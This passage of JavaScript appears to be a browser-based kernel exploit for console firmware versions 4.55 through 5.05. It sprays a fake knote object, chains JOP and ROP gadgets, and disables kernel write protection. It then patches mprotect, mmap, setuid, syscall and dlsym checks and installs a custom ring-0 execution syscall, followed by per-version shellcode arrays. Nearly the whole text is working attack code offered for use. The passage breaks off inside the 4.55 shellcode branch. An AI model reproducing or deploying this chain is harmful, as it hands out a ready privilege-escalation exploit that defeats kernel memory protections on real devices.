		p.write8(bpf_spray.add32(0x10), ctxp);     // Spray heap with the fake knote object
		p.write8(ctxp.add32(0x50), 0);             // Set knote->kn_status to 0 to detach
		p.write8(ctxp.add32(0x68), ctxp1); // Set knote->kn_fops to fake function table
		
		p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]);  // Set kn_fops->f_detach to first JOP gadget
		stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
		
		p.write8(ctxp.add32(0x00), ctxp2);  // Set rdi
		p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
		p.write8(ctxp2.add32(0x7D0), window.gadgets["jop2"]); // Chain to next gadget
		
		var iterbase = ctxp2;
		
		for (var i = 0; i < 0xF; i++) {
			p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
			stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
			
			p.write8(iterbase.add32(0x7D0 + 0x20), window.gadgets["jop2"]); // Chain to next gadget
			
			p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
			p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
			iterbase = iterbase.add32(0x20);
		}
		
		var raxbase = iterbase;
		var rdibase = iterbase.add32(0x08);
		var memcpy = get_jmptgt(webKitBase.add32(0xF8));
		memcpy = p.read8(memcpy);
		
		p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x18), rdibase);
		p.write8(rdibase.add32(0x08), krop.stackBase); // Sets RSI to krop stack's location
		p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]); // Save RSP
		
		p.write8(rdibase, raxbase); // [rdi] = rax
		p.write8(raxbase.add32(0x420), window.gadgets["jop6"]); // Chain to next gadget
		stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
		
		var topofchain = stackshift_from_retaddr;
		p.write8(raxbase.add32(0x40), memcpy.add32(0x32)); // Chain to memcpy
		p.write8(rdibase.add32(0xB0), topofchain); // Write size for memcpy
		
		for (var i = 0; i < 0x1000 / 8; i++)
			p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
		
		krop.count = 0x10;
		
		p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
		p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
		p.write8(kscratch.add32(0x18), kscratch);
		
		//krop.push(window.gadgets["infloop"]); // only for kexploit debug test
		
		krop.push(window.gadgets["pop rdi"]);
		krop.push(kscratch.add32(0x18));
		krop.push(window.gadgets["jop_mov rbp, rsp"]);
		
		var rboff = topofchain - krop.count * 8;
		
		krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
		rboff += window.gadgets_shift["stackshift_jop6"];
		krop.push(window.gadgets["pop rax"]);
		krop.push(rboff);
		krop.push(window.gadgets["add rdi, rax"]);
		
		if (fwFromUA == "5.01") {
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x2FA); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Save context of cr0 register
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0xC54B4); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["jmp rax"]);
			krop.push(window.gadgets["pop rdi"]); // save cr0
			krop.push(kscratch.add32(0x10));
			
			// Disable kernel write protection for .text
			krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
			krop.push(window.gadgets["pop rsi"]);
			krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
			krop.push(window.gadgets["and rax, rsi"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(8));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x9);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["mov rax, rdx"]);
			krop.push(window.gadgets["jmp rdi"]);
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x3609A); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x330));
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Patch sys_mprotect: Allow RWX mapping
			patch_mprotect = new int64(0x9090FA38, 0x90909090); // 5.01-5.05
			kpatch(0x3609A, patch_mprotect); // 5.01-5.05
			
			// Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			var patch_sys_setuid_offset = new int64(0xFFEE7016, 0xFFFFFFFF); // 5.01
			var patch_sys_setuid = new int64(0x000000B8, 0xC4894100); // 5.01-5.05
			kpatch(patch_sys_setuid_offset, patch_sys_setuid);
			
			// Patch amd64_syscall: syscall instruction allowed anywhere
			var patch_amd64_syscall_offset1 = new int64(0xFFE92A37, 0xFFFFFFFF); // 5.01
			var patch_amd64_syscall_offset2 = new int64(0xFFE92A55, 0xFFFFFFFF); // 5.01
			var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49); // 5.01-5.05
			var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090); // 5.01-5.05
			kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
			kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
			
			// Patch: sys_mmap: allow RWX mapping from anywhere
			var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF); // 5.01-5.05
			var patch_sys_mmap = new int64(0x37B64037, 0x3145C031); // 5.01-5.05
			kpatch(patch_sys_mmap_offset, patch_sys_mmap);
			
			// Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
			var patch_sys_dynlib_dlsym_1 = new int64(0x000000E9, 0x8B489000); // 5.01-5.05
			var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090); // 5.01-5.05
			kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1); // 5.01-5.05
			kpatch(0x1448F4, patch_sys_dynlib_dlsym_2); // 5.01
			
			// Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
			var patch_sys_exec_1 = new int64(0x00F0EDC4, 0); // 5.01
			var patch_sys_exec_2A = new int64(0x00F0EDCC, 0); // 5.01
			var patch_sys_exec_2B = new int64(0xFFEA5A04, 0xFFFFFFFF); // 5.01
			var patch_sys_exec_3 = new int64(0x00F0EDEC, 0); // 5.01
			var patch_sys_exec_param1 = new int64(0x02, 0);
			var patch_sys_exec_param3 = new int64(0, 1);
			kpatch(patch_sys_exec_1, patch_sys_exec_param1);
			kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
			kpatch(patch_sys_exec_3, patch_sys_exec_param3);
			
			// Enable kernel write protection for .text
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x09);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["jmp rdi"]);
			
		} else if (fwFromUA == "5.05") {
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x2FA);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Save context of cr0 register
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0xC54B4);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["jmp rax"]);
			krop.push(window.gadgets["pop rdi"]); // save cr0
			krop.push(kscratch.add32(0x10));
			
			// Disable kernel write protection for .text
			krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
			krop.push(window.gadgets["pop rsi"]);
			krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
			krop.push(window.gadgets["and rax, rsi"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(8));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x9);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["mov rax, rdx"]);
			krop.push(window.gadgets["jmp rdi"]);
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x3609A);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x330));
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Patch sys_mprotect: Allow RWX mapping
			patch_mprotect = new int64(0x9090FA38, 0x90909090);
			kpatch(0x3609A, patch_mprotect);
			
			// Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			var patch_sys_setuid_offset = new int64(0xFFEE6F06, 0xFFFFFFFF);
			var patch_sys_setuid = new int64(0x000000B8, 0xC4894100);
			kpatch(patch_sys_setuid_offset, patch_sys_setuid);
			
			// Patch amd64_syscall: syscall instruction allowed anywhere
			var patch_amd64_syscall_offset1 = new int64(0xFFE92927, 0xFFFFFFFF);
			var patch_amd64_syscall_offset2 = new int64(0xFFE92945, 0xFFFFFFFF);
			var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49);
			var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090);
			kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
			kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
			
			// Patch: sys_mmap: allow RWX mapping from anywhere
			var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF);
			var patch_sys_mmap = new int64(0x37B64037, 0x3145C031);
			kpatch(patch_sys_mmap_offset, patch_sys_mmap);
			
			// Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
			var patch_sys_dynlib_dlsym_1 = new int64(0x0001C1E9, 0x8B489000);
			var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090);
			kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1);
			kpatch(0x144AB4, patch_sys_dynlib_dlsym_2);
			
			// Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
			var patch_sys_exec_1 = new int64(0x00F0ECB4, 0);
			var patch_sys_exec_2A = new int64(0x00F0ECBC, 0);
			var patch_sys_exec_2B = new int64(0xFFEA58F4, 0xFFFFFFFF);
			var patch_sys_exec_3 = new int64(0x00F0ECDC, 0);
			var patch_sys_exec_param1 = new int64(0x02, 0);
			var patch_sys_exec_param3 = new int64(0, 1);
			kpatch(patch_sys_exec_1, patch_sys_exec_param1);
			kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
			kpatch(patch_sys_exec_3, patch_sys_exec_param3);
			
			// Enable kernel write protection for .text
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x09);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["jmp rdi"]);
			
		} else if (fwFromUA == "4.74") {
			
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1E48A0); // Slide of the return ptr from kernel base
			krop.push(window.gadgets["sub rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov [rsi], rdx"]);
			
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(window.gadgets["test"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			
			
			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x283129);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx_more"]);
			
			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
			var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x113B73);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kexploit_check_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch mprotect: Allow RWX (read-write-execute) mapping
			var mprotect_patch = new int64(0x9090EA38, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x397876);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(mprotect_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1413A4);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_mmap_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch syscall: syscall instruction allowed anywhere
			var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
			var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DD4B3);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DD4D1);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
			var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3D05AE);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x686A0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Add custom sys_exec() call to execute arbitrary code as kernel
			var kernel_exec_param = new int64(0, 1);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349A0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x02);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rsi"])
			krop.push(0x139A2F); // jmp qword ptr [rsi],done
			krop.push(window.gadgets["pop rdi"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349A8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349C8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_exec_param);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x283120);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
			
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
		} else if (fwFromUA == "4.55") {
			
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1E2640); // Slide of the return ptr from kernel base
			krop.push(window.gadgets["sub rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov [rsi], rdx"]);
			
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(window.gadgets["test"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			
			
			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x280f79);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx_more"]);
			
			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
			var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1144E3);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kexploit_check_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch mprotect: Allow RWX (read-write-execute) mapping
			var mprotect_patch = new int64(0x9090EA38, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x396A56);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(mprotect_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x141D14);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_mmap_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch syscall: syscall instruction allowed anywhere
			var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
			var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DC603);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DC621);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
			var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3CF6FE);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x690C0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Add custom sys_exec() call to execute arbitrary code as kernel
			var kernel_exec_param = new int64(0, 1);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8a0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x02);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rsi"])
			krop.push(0x13a39f); // jmp qword ptr [rsi],done
			krop.push(window.gadgets["pop rdi"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8a8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8c8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_exec_param);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x280f70);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
			
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
		}
		
		krop.push(window.gadgets["ret2userland"]);
		krop.push(kscratch.add32(0x1000));
		
		// END OF KROP
		
		var kq = p.malloc32(0x10);
		var kev = p.malloc32(0x100);
		kev.backing[0] = sock;
		kev.backing[2] = 0x1ffff;
		kev.backing[3] = 1;
		kev.backing[4] = 5;
		
		// Shellcode to clean up memory
		if (fwFromUA == "5.01") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xDF8024B4, 0x8D4D0010, 0x5AB024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "5.05") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "4.74") {
			var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "4.55") {
